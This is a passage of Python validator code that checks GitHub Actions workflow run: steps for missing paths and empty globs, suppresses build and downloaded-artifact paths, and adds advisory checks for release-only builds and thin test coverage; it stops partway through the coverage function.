_WORKFLOW_GLOB_CHARS: frozenset[str] = frozenset({"*", "?", "[", "]"})

# ── RC-WORKFLOW-PATH-BROKEN mid-job build-artifact awareness (issue #117/#116) ─
# A workflow that builds a binary and then runs it references a path that can
# NEVER exist in the repo — e.g. `bash scripts/.../stage.sh ...` produces
# `./dist/foo` and the next step runs `./dist/foo --help`. Flagging that as
# "does not exist on disk" is a FP on the normal shape of every build/release
# workflow. Before flagging a literal path, suppress it when EITHER signal holds
# (both kept narrow so a genuinely-broken canonical-entry-point ref still fires):
#   (a) the path sits under a conventional BUILD-OUTPUT directory; OR
#   (b) an EARLIER step in the SAME job plausibly CREATES it — an earlier run:
#       mentions the same path, or runs a build/compile/stage command.
# Conventional build-output roots (leading "./" tolerated, matched as the first
# path segment so a source dir like "distributions/" is NOT caught).
_WORKFLOW_BUILD_OUTPUT_DIRS: frozenset[str] = frozenset(
    {"dist", "build", "target", "out", "bin", ".bin", "output", "release", "artifacts"}
)
# Build/compile/stage command shapes an earlier step may use to produce a path.
# re2-safe (no lookaround); matched against earlier same-job run: text.
_WORKFLOW_BUILD_CMD_RE = re.compile(
    r"\bcargo\s+build\b"
    r"|\bgo\s+build\b"
    r"|\b(?:npm|pnpm|yarn|bun)\s+run\s+build\b"
    r"|\bmake\b"
    r"|\bcmake\b"
    r"|\bmeson\b"
    r"|\bgradle\b"
    r"|\bdotnet\s+build\b"
    r"|\bstage\b"  # a *stage* step (e.g. scripts/.../stage.sh) produces artifacts
    r"|\bbuild\.sh\b",
    re.IGNORECASE,
)


def _strip_leading_dotslash(token: str) -> str:
    """Drop a single leading ``./`` from a path token (``./dist/x`` → ``dist/x``)."""
    return token[2:] if token.startswith("./") else token


def _is_under_build_output_dir(token: str) -> bool:
    """True iff ``token``'s FIRST path segment is a conventional build-output
    directory (``dist/``, ``build/``, ``target/`` … with a leading ``./``
    tolerated). Matching the leading segment (not a substring) avoids catching
    a legitimate source dir whose name merely starts with one of these words
    (e.g. ``distributions/foo``)."""
    cleaned = _strip_leading_dotslash(token)
    head = cleaned.split("/", 1)[0]
    return bool(head) and head in _WORKFLOW_BUILD_OUTPUT_DIRS


def _collect_jobs_run_text(content: str) -> list[tuple[int, int, str]]:
    """Return one ``(job_start_line, job_end_line, job_run_text)`` triple per
    workflow JOB — the concatenation of every ``run:`` body in that job, used to
    answer "does an earlier step in the same job create this path?".

    Best-effort structural parse via ``yaml.safe_load``. The line span is
    located by re-finding each job's first non-empty ``run:`` body and the next
    job's start. On any parse failure the list is empty, so the caller falls
    back to flagging (FN-safe — a real broken ref is never silently dropped by
    a parse failure)."""
    try:
        doc = yaml.safe_load(content)
    except yaml.YAMLError:
        return []
    if not isinstance(doc, dict):
        return []
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return []

    results: list[tuple[int, int, str]] = []
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        run_bodies: list[str] = []
        if isinstance(steps, list):
            for step in steps:
                if isinstance(step, dict) and isinstance(step.get("run"), str):
                    run_bodies.append(step["run"])
        if not run_bodies:
            continue
        # Locate the job's line span: first run body line → last run body's end.
        first_line, _ = _locate_run_body(content, run_bodies[0], 0)
        last_line = first_line
        cursor = 0
        for body in run_bodies:
            ln, cursor = _locate_run_body(content, body, cursor)
            last_line = max(last_line, ln + body.count("\n"))
        results.append((first_line, last_line, "\n".join(run_bodies)))
    return results


def _is_mid_job_build_artifact(
    token: str,
    line_no: int,
    content: str,
    jobs_run_text: list[tuple[int, int, str]],
) -> bool:
    """True iff the literal ``token`` at ``line_no`` is a build artifact that an
    EARLIER step in its SAME job creates — signal (b) of the issue-#116 fix.

    Finds the job whose line span contains ``line_no``, takes that job's raw
    YAML lines UP TO (not including) ``line_no`` (the earlier steps), and
    returns True when that earlier text either mentions the same path token or
    runs a build/compile/stage command. Signal (a) — build-output-dir — is
    checked separately by the caller so it works even without a parseable job
    structure. ``content`` is the raw workflow source; line numbers are
    1-based to match the rest of the validator."""
    cleaned = _strip_leading_dotslash(token)
    src_lines = content.splitlines()
    for job_start, job_end, _job_text in jobs_run_text:
        if not (job_start <= line_no <= job_end):
            continue
        # Earlier-in-job text = raw YAML from the job's first run body line up
        # to (excluding) the offending line. 1-based → 0-based slice; clamp.
        lo = max(0, job_start - 1)
        hi = max(lo, line_no - 1)
        earlier_text = "\n".join(src_lines[lo:hi])
        if cleaned and cleaned in earlier_text:
            return True
        if token in earlier_text:
            return True
        if _WORKFLOW_BUILD_CMD_RE.search(earlier_text):
            return True
        return False
    return False


# ── RC-WORKFLOW-PATH-BROKEN download-artifact awareness (TRDD-V7K2QF8M) ────────
# A path CONSUMED by a run: step but PRODUCED at runtime by an earlier
# actions/download-artifact step can never exist in the repo checkout — the
# action materialises the artifacts under its `with.path:` directory at job
# runtime. Flagging such a path "does not exist on disk" is a FP on the standard
# fan-in shape: a matrix of jobs uploads per-shard reports, then an aggregate job
# downloads them into e.g. `reports-in/` and merges (exactly CPV's own free-CI
# matrix-shard Validate job). Signal (b)'s _collect_jobs_run_text only harvests
# `run:` bodies, so it is BLIND to a download-artifact step (a `uses:` step) — a
# separate structural pass is needed. Kept PER-JOB (artifacts live on one
# runner; a download in job A does not populate job B's checkout) and NARROW
# (only the download-artifact action, only its explicit non-`.` path dir) so a
# genuinely-broken repo reference in the same job still fires.
_DOWNLOAD_ARTIFACT_ACTION: str = "download-artifact"


def _collect_jobs_artifact_dirs(content: str) -> list[tuple[int, int, set[str]]]:
    """Return one ``(job_start_line, job_end_line, artifact_dirs)`` triple per
    workflow JOB that has at least one ``run:`` body, where ``artifact_dirs`` is
    the set of directories that job's ``actions/download-artifact`` steps
    materialise (their explicit ``with.path:`` value; an omitted/`.`/empty path
    is DELIBERATELY not recorded — extraction into the CWD cannot be mapped to a
    known dir, so suppressing on it would risk masking a real broken ref).

    The job line span is computed exactly as in ``_collect_jobs_run_text`` (from
    the job's ``run:`` bodies) — a job with no ``run:`` body can hold no flagged
    token, so it needs no entry. Best-effort structural parse via
    ``yaml.safe_load``; on any parse failure the list is empty and the caller
    falls back to flagging (FN-safe — a real broken ref is never silently
    dropped by a parse failure)."""
    try:
        doc = yaml.safe_load(content)
    except yaml.YAMLError:
        return []
    if not isinstance(doc, dict):
        return []
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return []

    results: list[tuple[int, int, set[str]]] = []
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        run_bodies: list[str] = []
        artifact_dirs: set[str] = set()
        for step in steps:
            if not isinstance(step, dict):
                continue
            if isinstance(step.get("run"), str):
                run_bodies.append(step["run"])
            uses = step.get("uses")
            if isinstance(uses, str) and _DOWNLOAD_ARTIFACT_ACTION in uses:
                with_block = step.get("with")
                if isinstance(with_block, dict) and isinstance(with_block.get("path"), str):
                    d = _strip_leading_dotslash(with_block["path"].strip()).rstrip("/")
                    if d and d != ".":
                        artifact_dirs.add(d)
        # No run body → no flaggable token here; no artifact dir → nothing to
        # suppress. Either way this job contributes no suppression span.
        if not run_bodies or not artifact_dirs:
            continue
        first_line, _ = _locate_run_body(content, run_bodies[0], 0)
        last_line = first_line
        cursor = 0
        for body in run_bodies:
            ln, cursor = _locate_run_body(content, body, cursor)
            last_line = max(last_line, ln + body.count("\n"))
        results.append((first_line, last_line, artifact_dirs))
    return results


def _is_downloaded_artifact_path(
    token: str,
    line_no: int,
    jobs_artifact_dirs: list[tuple[int, int, set[str]]],
) -> bool:
    """True iff the literal ``token`` at ``line_no`` resolves UNDER a directory
    that an ``actions/download-artifact`` step in its SAME job materialises at
    runtime — so the path is produced, not a broken repo reference.

    FN-safe: a token outside every download-artifact ``path:`` dir (a genuine
    missing file) is not suppressed, and a matching path in a DIFFERENT job than
    the download step still flags (per-job scoping — artifacts are per-runner)."""
    cleaned = _strip_leading_dotslash(token)
    for job_start, job_end, artifact_dirs in jobs_artifact_dirs:
        if not (job_start <= line_no <= job_end):
            continue
        for d in artifact_dirs:
            if cleaned == d or cleaned.startswith(d + "/"):
                return True
        return False
    return False


# Trailing shell control operators that frequently glue onto path-like
# tokens because shlex.split does NOT consume them as token separators —
# they are shell metacharacters, not whitespace. Without stripping them,
# `for h in scripts/hooks/*.py; do` produces the token
# `scripts/hooks/*.py;` (with the semicolon attached), which globs to
# zero matches and triggers a spurious MAJOR. Symmetric set for leading
# operators (case branches, leading pipes); the sets must remain narrow
# so we don't accidentally strip a leading dot or path separator.
_TRAILING_SHELL_OPS: str = ";)&|<>"
_LEADING_SHELL_OPS: str = "(&|"


def _strip_shell_ops(token: str) -> str:
    """Remove trailing/leading shell control operators (``;``, ``)``,
    ``&``, ``|``, ``<``, ``>``, ``(``) that shlex.split leaves glued onto
    path-like tokens. ``str.rstrip`` / ``lstrip`` take a *set* of
    characters, so this collapses runs of mixed operators in one pass
    (e.g. ``scripts/foo.sh;)`` → ``scripts/foo.sh``).
    """
    return token.lstrip(_LEADING_SHELL_OPS).rstrip(_TRAILING_SHELL_OPS)


def _looks_like_workflow_path(token: str) -> bool:
    """True iff ``token`` is a candidate path argument extracted from a
    workflow ``run:`` body.

    Excludes flag tokens (``-x``), URLs (``http://...``, ``https://...``),
    env-var refs (``${{ matrix.x }}``, ``$FOO``, ``${HOME}``), tokens
    that *contain* a shell variable reference anywhere (``./$h``,
    ``path/${VAR}/x.sh``), bare binaries (``shellcheck``, ``bash``), and
    KEY=VALUE assignments.
    """
    if not token:
        return False
    # Flags: -x, --foo, ---bar (anything starting with `-`).
    if token.startswith("-"):
        return False
    # URLs.
    lowered = token.lower()
    if (
        lowered.startswith("http://")
        or lowered.startswith("https://")
        or lowered.startswith("git+ssh://")
        or lowered.startswith("ssh://")
    ):
        return False
    # Shell variable references and GitHub Actions expressions. ${{ ... }}
    # is the GHA expression form; $FOO and ${FOO} are POSIX shell. We
    # exclude the token when ``$`` appears ANYWHERE in it — not just at
    # the start. shlex.split with posix=True strips the surrounding
    # quotes from `./"$h"`, leaving the bare string `./$h` which would
    # otherwise pass the path-prefix check below and be reported as a
    # missing literal. Any token containing ``$`` is dynamic at runtime
    # and cannot be statically validated against the filesystem, so the
    # honest answer is "not a literal path".
    if "$" in token:
        return False
    # Backticked command substitutions are not paths. ($-anchored
    # substitutions like $(...) are already excluded by the $-anywhere
    # rule above.)
    if token.startswith("`"):
        return False
    # KEY=VALUE shell assignments — the token isn't a path even when the value
    # part *contains* one (the assignment as a whole is a single token).
    if "=" in token and "/" not in token.split("=", 1)[0]:
        return False
    # Issue #36 fix: GitHub Actions workflow-command annotations
    # (``::error::``, ``::warning::``, ``::notice::``, ``::group::``,
    # ``::endgroup::``, ``::add-mask::``, etc.) are not paths. The
    # quoted string after the ``::`` markers can mention a script path
    # by name (e.g. ``::error::This tag was likely pushed without going
    # through scripts/publish.py``) but the whole token is a message
    # body, not a path argument. POSIX paths cannot contain the
    # sequence ``::`` (a colon is legal in a filename, but the literal
    # ``::error::`` shape is unique to GHA annotations).
    if "::" in token:
        return False
    # Real paths do not contain whitespace AFTER shlex.split has run.
    # shlex.split with posix=True collapses any surrounding quotes, so
    # a quoted string like ``"foo bar.sh"`` becomes the single token
    # ``foo bar.sh``. Such tokens look like a path-with-space, but
    # workflow ``run:`` bodies almost always use script-named-without-
    # spaces — and a workflow author quoting a space-containing string
    # is overwhelmingly likely to be passing a message, not a path.
    if any(ws in token for ws in (" ", "\t", "\n")):
        return False
    # Path-shape heuristic — must start with one of the known repo prefixes
    # OR end in a recognised extension. Avoids flagging bare command names
    # like ``shellcheck`` or ``bash``.
    if any(token.startswith(p) for p in _WORKFLOW_PATH_PREFIXES):
        return True
    if token.endswith((".sh", ".py", ".yml", ".yaml", ".toml", ".json")):
        # An unprefixed extension hit ('foo.sh') is too aggressive — only
        # flag when the token also contains a path separator. ``echo done.sh``
        # would otherwise emit a false positive.
        if "/" in token:
            return True
    return False


def _is_workflow_glob(token: str) -> bool:
    """Treat ``token`` as a glob iff it contains shell wildcards. Anything
    else is a literal path. Mirrors Python's ``glob`` module which treats
    ``*``, ``?`` and ``[…]`` as wildcards."""
    return any(ch in _WORKFLOW_GLOB_CHARS for ch in token)


def _scan_workflow_run_body(body: str, body_start_line: int) -> list[tuple[str, int]]:
    """Yield (token, absolute_line_no) tuples for every path-like token
    found in a workflow ``run:`` body.

    The body may be multi-line (``run: |`` literal block scalar). Each
    line is shlex-tokenised independently with ``posix=True`` so quoted
    strings collapse to single tokens. Tokeniser failures (unbalanced
    quotes from ``run: |`` heredoc bodies, half-written EOF blocks, etc.)
    fall back to whitespace-splitting that line — better than skipping
    the entire file.
    """
    results: list[tuple[str, int]] = []
    for offset, line in enumerate(body.splitlines()):
        # Comments and empty lines: nothing to extract.
        stripped = line.lstrip()
        if not stripped or stripped.startswith("#"):
            continue
        try:
            tokens = shlex.split(line, comments=True, posix=True)
        except ValueError:
            tokens = line.split()
        for raw_token in tokens:
            # Strip shell control operators that shlex.split does not treat
            # as token separators (`;`, `)`, `&`, `|`, `<`, `>` trailing;
            # `(`, `&`, `|` leading). Without this step the for-loop
            # syntax `for h in scripts/hooks/*.py; do` produces the token
            # `scripts/hooks/*.py;` — a glob that matches zero files and
            # triggers a spurious MAJOR. The strip is safe: pathnames
            # ending in those characters are not legal in POSIX command
            # arguments without explicit quoting (which shlex would have
            # consumed before we see the token here).
            token = _strip_shell_ops(raw_token)
            if _looks_like_workflow_path(token):
                results.append((token, body_start_line + offset))
    return results


def _collect_run_blocks(content: str) -> list[tuple[str, int]]:
    """Extract every ``run:`` body from a workflow YAML as a (body, line_no)
    list. Falls back to a regex pass when ``yaml.safe_load`` fails — better
    than giving up because of a single malformed step.

    We use a hybrid approach: PyYAML for structural extraction, then
    re-locate the body in the raw source so we can attach correct line
    numbers (PyYAML strips them). The line number returned is the line
    of the first content line of the body, NOT the line of the ``run:``
    key — the user wants citations like ``ci.yml:42`` to point at the
    offending command, not at the block-header line above it.
    """
    blocks: list[tuple[str, int]] = []

    # ── Structural pass via yaml.safe_load ────────────────────────────
    try:
        doc = yaml.safe_load(content)
    except yaml.YAMLError:
        doc = None

    # Monotonic search cursor so repeated identical ``run:`` bodies are each
    # located at their own offset rather than all matching the first occurrence
    # (audit MED #46). PyYAML preserves mapping insertion order, so ``_walk``
    # visits ``run:`` keys in (approximately) source order, which is what makes
    # advancing a single forward-only cursor correct.
    search_cursor = 0

    def _walk(node: Any) -> None:
        nonlocal search_cursor
        if isinstance(node, dict):
            for k, v in node.items():
                if k == "run" and isinstance(v, str):
                    body_start, search_cursor = _locate_run_body(content, v, search_cursor)
                    blocks.append((v, body_start))
                else:
                    _walk(v)
        elif isinstance(node, list):
            for item in node:
                _walk(item)

    if doc is not None:
        _walk(doc)
        if blocks:
            return blocks

    # ── Regex fallback ─────────────────────────────────────────────────
    # When PyYAML can't parse (e.g. tab indentation, unsupported tag), or
    # the document parsed but contained zero ``run:`` keys (some workflows
    # use only ``uses:`` actions), fall back to a regex that finds every
    # ``run:`` line and grabs either the inline value or the literal-block
    # body that follows.
    pattern = re.compile(r"^([ \t]*)run:[ \t]*(\|[+-]?|>[+-]?)?[ \t]*(.*)$", re.MULTILINE)
    for m in pattern.finditer(content):
        indent = m.group(1)
        block_marker = (m.group(2) or "").strip()
        inline_value = m.group(3)
        # Line number of the body's first physical line (NOT the run: line
        # itself — the diagnostic message should point at the offending
        # command). For inline ``run: foo`` that's the same line; for
        # block ``run: |`` it's the next line.
        line_at_run_key = content[: m.start()].count("\n") + 1
        if block_marker.startswith("|") or block_marker.startswith(">"):
            # Block scalar — collect indented continuation lines.
            lines = content.splitlines()
            start_idx = line_at_run_key  # 1-based: line AFTER the run: line
            collected: list[str] = []
            for idx in range(start_idx, len(lines)):
                line = lines[idx]
                if not line.strip():
                    collected.append("")
                    continue
                # Block ends when indentation regresses to or below the
                # ``run:`` line's indentation.
                line_indent = line[: len(line) - len(line.lstrip())]
                if len(line_indent) <= len(indent):
                    break
                collected.append(line)
            body = "\n".join(collected).rstrip("\n")
            blocks.append((body, start_idx + 1))  # 1-based body line
        else:
            blocks.append((inline_value or "", line_at_run_key))

    return blocks


def _locate_run_body(content: str, body: str, search_from: int = 0) -> tuple[int, int]:
    """Best-effort 1-based line number of a ``run:`` body inside the raw
    YAML source. Used when PyYAML stripped the line metadata.

    Strategy: search for the first non-empty line of ``body`` as a substring,
    starting at character offset ``search_from``. Returns ``(line_no, next_pos)``
    where ``next_pos`` is the character offset just past the match — the caller
    passes it back as ``search_from`` for the next body so that two ``run:``
    blocks sharing the same first non-empty line resolve to DISTINCT source
    lines instead of both collapsing onto the first occurrence (audit MED #46).
    Falls back to ``(1, search_from)`` when the body can't be located, leaving
    the cursor unmoved.
    """
    first_line = next((line for line in body.splitlines() if line.strip()), body)
    if not first_line:
        return 1, search_from
    needle = first_line.strip()
    idx = content.find(needle, search_from)
    if idx < 0:
        return 1, search_from
    return content[:idx].count("\n") + 1, idx + len(needle)


def validate_workflow_path_broken(plugin_root: Path, report: ValidationReport) -> None:
    """Detect broken literal paths and zero-match globs in workflow ``run:``
    bodies — issue #21 ask #2 (RC-WORKFLOW-PATH-BROKEN, MAJOR).

    Symptom this rule catches: a canonical-pipeline migration that
    consolidates several scripts/*.sh helpers into publish.py but leaves
    the workflow YAML still invoking the old shellcheck-on-globs lines:

        run: shellcheck scripts/dispatch.sh scripts/detectors/*.sh \\
                        scripts/hooks/*.sh scripts/lib/*.sh .githooks/pre-push

    After consolidation, ``scripts/detectors/`` no longer exists, so
    ``scripts/detectors/*.sh`` matches zero files and the workflow
    silently passes (shellcheck reports zero issues on zero files). The
    plugin then ships with NO shellcheck coverage, even though CI says
    "green."

    This validator detects the symptom by:
      1. Walking every ``.github/workflows/*.yml``/``*.yaml`` file.
      2. Extracting every ``run:`` body (multi-line block scalars too).
      3. shlex-tokenising each line and selecting "path-like" tokens
         via ``_looks_like_workflow_path``.
      4. For literals: ``(plugin_root / token).exists()`` → MAJOR if
         missing.
      5. For globs (token contains ``*``/``?``/``[``): ``glob.glob`` from
         the plugin root → MAJOR if zero matches.

    Severity is MAJOR (not CRITICAL): the workflow still runs, but the
    intended check is silently no-op'd. MAJOR means publish.py blocks the
    release until the dangling reference is fixed. Severity NOT CRITICAL
    because there is no security loss — only a lost lint/test signal.

    Skipped when:
      - The plugin has no ``.github/workflows/`` directory.
      - The token is a flag (``-x``), URL, env-var ref, or KEY=VALUE
        assignment (handled by ``_looks_like_workflow_path``).
    """
    workflows_dir = plugin_root / ".github" / "workflows"
    if not workflows_dir.is_dir():
        return

    yaml_files: list[Path] = sorted(workflows_dir.glob("*.yml")) + sorted(workflows_dir.glob("*.yaml"))
    if not yaml_files:
        return

    plugin_root_str = str(plugin_root)
    found_any = False

    for yaml_path in yaml_files:
        try:
            content = yaml_path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        rel_path = str(yaml_path.relative_to(plugin_root))

        # Issue #116: per-job run-text spans, so a literal path that an earlier
        # step in the SAME job builds (e.g. `./dist/foo` after a stage/build
        # step) is recognised as a build artifact rather than flagged as
        # missing. Computed once per file.
        jobs_run_text = _collect_jobs_run_text(content)

        # TRDD-V7K2QF8M: a path materialised at runtime by an actions/download-
        # artifact step (under its with.path: dir) is not a repo file — collect
        # those per-job dirs once so the token loop can skip them. Signal (b)'s
        # run-text pass is blind to a `uses:` download step, so this is separate.
        jobs_artifact_dirs = _collect_jobs_artifact_dirs(content)

        run_blocks = _collect_run_blocks(content)
        for body, body_start_line in run_blocks:
            for token, line_no in _scan_workflow_run_body(body, body_start_line):
                # A runtime-downloaded artifact path is produced on the runner,
                # never present in the repo checkout — do not flag it. FN-safe:
                # a token outside every download-artifact path: dir (a genuine
                # missing file) falls through and is still validated below.
                if _is_downloaded_artifact_path(token, line_no, jobs_artifact_dirs):
                    continue
                if _is_workflow_glob(token):
                    # Resolve the glob from the plugin root. Use
                    # ``recursive=False`` so ``*`` does NOT cross directory
                    # boundaries (matches shell glob semantics, which is
                    # what the workflow author wrote). ``**/*.sh`` would
                    # need recursive=True, but the heuristic above only
                    # accepts tokens with ``*`` not ``**``-style — and
                    # even if it did, shell globs default non-recursive
                    # unless the user enables ``shopt -s globstar``.
                    abs_pattern = str(Path(plugin_root_str) / token)
                    matches = _glob.glob(abs_pattern)
                    if not matches:
                        found_any = True
                        report.major(
                            f"[RC-WORKFLOW-PATH-BROKEN] {rel_path}:{line_no} — "
                            f"glob '{token}' matches zero files in the plugin tree. "
                            "If a canonical-pipeline migration consolidated the "
                            "matched files into publish.py, remove the dangling "
                            "glob from the workflow body; otherwise restore the "
                            "missing files.",
                            file=rel_path,
                            line=line_no,
                        )
                else:
                    target = plugin_root / token
                    if not target.exists():
                        # Issue #116: a mid-job build artifact can never exist in
                        # the repo. Suppress when the path is under a build-output
                        # directory (signal a) OR an earlier same-job step builds
                        # it (signal b). FN-safe: a broken ref to a real canonical
                        # entry-point (NOT under a build dir, NOT created earlier)
                        # still flags — e.g. `python scripts/removed-real-file.py`.
                        if _is_under_build_output_dir(token) or _is_mid_job_build_artifact(
                            token, line_no, content, jobs_run_text
                        ):
                            continue
                        found_any = True
                        report.major(
                            f"[RC-WORKFLOW-PATH-BROKEN] {rel_path}:{line_no} — "
                            f"literal path '{token}' does not exist on disk. "
                            "Update the workflow to point at the new canonical "
                            "entry-point (e.g. publish.py / cpv_lint_engine), or "
                            "restore the missing file.",
                            file=rel_path,
                            line=line_no,
                        )

    if not found_any and yaml_files:
        report.passed(
            f"All workflow run: paths/globs resolve in {len(yaml_files)} workflow file(s) (RC-WORKFLOW-PATH-BROKEN)"
        )


def check_untested_until_release(plugin_root: Path, report: ValidationReport) -> None:
    """Advisory WARNING (NON-BLOCKING): flag a workflow that builds/stages a
    COMPILED BINARY artifact reachable ONLY from tag/release triggers, with NO
    sibling CI push-triggered smoke job exercising the same build/stage
    (RC-UNTESTED-UNTIL-RELEASE, #115 part-5).

    Symptom this catches: a tag-only staging step (e.g. ``cargo build`` then a
    ``stage.sh`` that copies ``target/release/<bin>`` into the release-upload
    dir) that passes actionlint+zizmor+CPV statically but is NEVER exercised by
    a normal push/PR — so a broken path (wrong ``target/`` dir, missing flag)
    is invisible until a tag is cut and fails on every platform at release. The
    fix is a CI smoke job that runs the SAME build+stage on push.

    PRECISION (the make-or-break): the standard canonical ``release.yml`` is
    ALSO tag-triggered and ALSO runs ``gh release upload … SHA256SUMS``, but it
    only stages plain TEXT reports — it has NO compiled-artifact build/stage
    step, so it produces ZERO findings here (verified against the real
    ``gen_release_yml`` output). The discriminator is the binary build/stage,
    delegated to ``cpv_pipeline_profile.workflow_has_compiled_artifact_build``.

    Severity is WARNING — visible but NON-BLOCKING. It NEVER changes the
    VALID/INVALID verdict and NEVER blocks ``--strict`` (advisory only).

    Best-effort + side-effect-free: any error in the underlying detection is
    swallowed by the helper (returns ``[]``), so this never crashes the run.
    """
    # Local import (mirrors the other cpv_pipeline_profile call sites in this
    # module — the helper is regex-only, no PyYAML dependency, all best-effort).
    from cpv_pipeline_profile import untested_until_release_workflows

    offenders = untested_until_release_workflows(plugin_root)
    for wf in offenders:
        try:
            rel_path = str(wf.relative_to(plugin_root))
        except ValueError:
            rel_path = wf.name
        report.warning(
            f"[RC-UNTESTED-UNTIL-RELEASE] {rel_path} — builds/stages compiled "
            "artifacts but runs only on tag/release triggers; no push/PR-triggered "
            "smoke job exercises the build/stage, so a broken step is invisible "
            "until a tag is cut (the janitor v0.7.0 staging incident). Add a CI "
            "smoke job that runs the same build+stage on push (build ONE target, "
            "run the same stage script, execute the staged binary). Advisory only "
            "— this WARNING does not block the publish.",
            file=rel_path,
        )


# ── Test-coverage audit (issue #155) — advisory, NON-BLOCKING ────────────────
# Generic test-file shapes across the Claude-Code plugin ecosystem (Python
# pytest/unittest + JS/TS jest/vitest/mocha). No runner-name assumptions.
_COVERAGE_TEST_GLOBS: tuple[str, ...] = (
    "test_*.py",
    "*_test.py",
    "*.test.js",
    "*.test.jsx",
    "*.test.ts",
    "*.test.tsx",
    "*.spec.js",
    "*.spec.jsx",
    "*.spec.ts",
    "*.spec.tsx",
)

# A hook SCRIPT (testable executable) vs hooks.json / *.md (config + docs).
_COVERAGE_HOOK_SCRIPT_EXTS: frozenset[str] = frozenset(
    {".py", ".sh", ".bash", ".js", ".mjs", ".cjs", ".ts"}
)

# Path segments that never hold the plugin's OWN test suite — skip them during
# test discovery so a vendored/installed package's tests can't be counted as the
# plugin's coverage (nor slow the scan on a huge dependency tree).
_COVERAGE_SKIP_SEGMENTS: frozenset[str] = frozenset(
    {
        ".git",
        ".hg",
        ".svn",
        ".venv",
        "venv",
        "node_modules",
        "site-packages",
        "__pycache__",
        ".tox",
        ".nox",
        ".mypy_cache",
        ".pytest_cache",
        ".ruff_cache",
    }
)

# Cap the total test-file content read for the content-mention fallback so a
# pathologically large suite can't slow this advisory check down. Filename
# matching stays unbounded (cheap).
_COVERAGE_CONTENT_SCAN_CAP = 5_000_000


def _coverage_path_is_vendored(path: Path, root: Path) -> bool:
    """True if any segment of ``path`` (relative to ``root``) is a vendored /
    build / VCS directory that never holds the plugin's own test suite."""
    try:
        rel = path.relative_to(root)
    except ValueError:
        return False
    return any(seg in _COVERAGE_SKIP_SEGMENTS for seg in rel.parts)


def _coverage_enumerate_components(plugin_root: Path) -> list[tuple[str, str]]:
    """Testable components as (display-path, match-token) by generic layout.

    Mirrors the per-directory glob idiom of validate_scripts/validate_commands/
    validate_agents/validate_hooks/validate_skills (there is no shared
    enumeration helper — each inlines its own glob). The token is the stem a
    conventional test filename/content would reference.
    """
    components: list[tuple[str, str]] = []

    scripts_dir = plugin_root / "scripts"
    if scripts_dir.is_dir():
        for py in sorted(scripts_dir.glob("*.py")):
            components.append((str(py.relative_to(plugin_root)), py.stem.lower()))

    hooks_dir = plugin_root / "hooks"
    if hooks_dir.is_dir():
        for hook in sorted(hooks_dir.rglob("*")):
            if (
                hook.is_file()
                and hook.suffix.lower() in _COVERAGE_HOOK_SCRIPT_EXTS
                and not _coverage_path_is_vendored(hook, plugin_root)
            ):
                components.append((str(hook.relative_to(plugin_root)), hook.stem.lower()))

    skills_dir = plugin_root / "skills"
    if skills_dir.is_dir():
        # A skill's identity is its directory name, not the literal "SKILL".
        for skill_md in sorted(skills_dir.glob("*/SKILL.md")):
            components.append(
                (str(skill_md.relative_to(plugin_root)), skill_md.parent.name.lower())
            )

    for comp_dir_name in ("commands", "agents"):
        comp_dir = plugin_root / comp_dir_name
        if comp_dir.is_dir():
            for md in sorted(comp_dir.glob("*.md")):
                components.append((str(md.relative_to(plugin_root)), md.stem.lower()))

    return components


def _coverage_discover_tests(plugin_root: Path) -> list[Path]:
    """Test files anywhere under the plugin, by conventional filename patterns,
    excluding vendored/installed-package trees (so their tests never count as
    the plugin's own coverage)."""
    test_files: list[Path] = []
    seen: set[Path] = set()
    for pattern in _COVERAGE_TEST_GLOBS:
        for tf in plugin_root.rglob(pattern):
            if tf.is_file() and tf not in seen and not _coverage_path_is_vendored(tf, plugin_root):
                seen.add(tf)
                test_files.append(tf)
    return test_files


def _coverage_test_blobs(test_files: list[Path]) -> tuple[str, str]:
    """(filename-blob, bounded-content-blob), both lowercased, for matching.

    Filename matching is cheap and unbounded; the content scan is capped
    (``_COVERAGE_CONTENT_SCAN_CAP``) so a huge suite can't slow this advisory
    down. Any read error is swallowed — best-effort, never crashes the run.
    """
    name_blob = "\n".join(tf.name.lower() for tf in test_files)
    content_parts: list[str] = []
    total = 0
    for tf in test_files:
        if total >= _COVERAGE_CONTENT_SCAN_CAP:
            break
        try:
            text = tf.read_text(encoding="utf-8", errors="ignore").lower()
        except OSError:
            continue
        content_parts.append(text)
        total += len(text)
    return name_blob, "\n".join(content_parts)


def check_test_coverage(plugin_root: Path, report: ValidationReport) -> None:
    """Advisory WARNING (NON-BLOCKING): flag shipped components that have no
    discoverable test, in a plugin that DOES ship a test suite (issue #155).

    A green CI "Test" job does not prove real coverage — a plugin can ship many
    scripts behind a suite that exercises only one of them. This enumerates
    testable components by GENERIC Claude-Code conventions (``scripts/*.py``,
    ``hooks/`` script files, ``skills/*/SKILL.md``, ``commands/*.md``,
    ``agents/*.md``) and cross-references them against tests discovered
    generically (the conventional ``test_*.py`` / ``*_test.py`` /
    ``*.test.{js,ts}`` / ``*.spec.{js,ts}`` filename patterns, anywhere under the
    plugin), matching a component to a test by filename stem or content mention.

    UNIVERSAL: zero marketplace / ai-maestro / author-naming-convention
    assumptions — only the standard plugin directory layout and the conventional
    test-file shapes. WARN-only: emitted through ``report.warning(...)``, which
    ``exit_code_strict()`` never blocks on — it NEVER changes the VALID/INVALID
    verdict or a ``--strict`` / publish outcome.

    CONSERVATIVE (does not spam): it fires ONLY when the plugin already ships at
    least one test file — i.e. it opted into testing but its suite looks thin. A
    plugin with no test suite at all gets ZERO findings here (nagging every
    test-less plugin would be noise, and issue #155 is specifically about the
    deceptive green-suite case, which by definition has a suite). Matching is
    generous (a component counts as covered on any filename-stem OR content
    mention), so the check under-warns rather than over-warns — the safe
    direction for an advisory.
    """
    components = _coverage_enumerate_components(plugin_root)
    if not components:
        # Nothing testable — not an error (mirrors the no-directory convention).
        return

    test_files = _coverage_discover_tests(plugin_root)
    if not test_files:
        # No test suite at all → stay silent (conservative: only audit plugins
        # that have opted into testing; see the docstring).
        return

    name_blob, content_blob = _coverage_test_blobs(test_files)
    untested = [
        rel_path
        for rel_path, token in components
        if token and token not in name_blob and token not in content_blob
    ]
    if not untested:
        return

    # ONE advisory WARNING (count + capped list). Wording deliberately avoids the
    # fix-ledger publish-blocking-marker substrings and carries the proven
    # "Advisory only — this WARNING does not block the publish." phrasing of its
